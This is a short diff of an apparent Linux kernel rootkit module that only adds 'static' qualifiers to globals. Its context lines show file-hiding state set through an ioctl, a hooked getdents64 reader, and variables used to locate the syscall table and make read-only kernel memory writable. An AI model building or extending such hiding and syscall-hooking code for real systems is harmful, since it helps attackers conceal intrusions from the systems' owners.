@@ -95,12 +95,12 @@ static int major;
 // so lkm_exit can unregister the exact same region (unregister_chrdev_region
 // takes a dev_t, not a bare major number).
 static dev_t lkm_dev_no;
-struct cdev *kernel_cdev;
+static struct cdev *kernel_cdev;
 
 /* ---- file hiding state ---- */
 // Points to a static empty string initially; replaced by a kmalloc'd buffer in IOCTL_FILE_HIDE.
 // The empty-string sentinel is checked via *HIDDEN_FILE != '\0' before kfree — do not set to NULL.
-char *HIDDEN_FILE = "";
+static char *HIDDEN_FILE = "";
 // Protects HIDDEN_FILE against a reader in hacked_getdents64 racing a concurrent
 // IOCTL_FILE_HIDE writer: without this, the writer's kfree() of the old buffer
 // can run while the reader still holds the stale pointer (use-after-free).
@@ -112,9 +112,9 @@ static struct kprobe kp = {
 };
 // the necessary variables that the syscall table requires to access and modify
 static unsigned long *__sys_call_table;
-void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
-unsigned long start_rodata;
-unsigned long init_begin;
+static void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
+static unsigned long start_rodata;
+static unsigned long init_begin;
 // Size of the read-only data section. Used to temporarily make the syscall table writable.
 // Parenthesized so the subtraction stays atomic if this macro is ever combined
 // with another operator at a future call site (e.g. `section_size * 2`).
@@ -400,7 +400,7 @@ static long lkm_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg)
 }
 
 /* File operations structure */
-struct file_operations fops = {
+static struct file_operations fops = {
 	.open = lkm_open,
 	.unlocked_ioctl = lkm_ioctl,
 	.release = lkm_release,
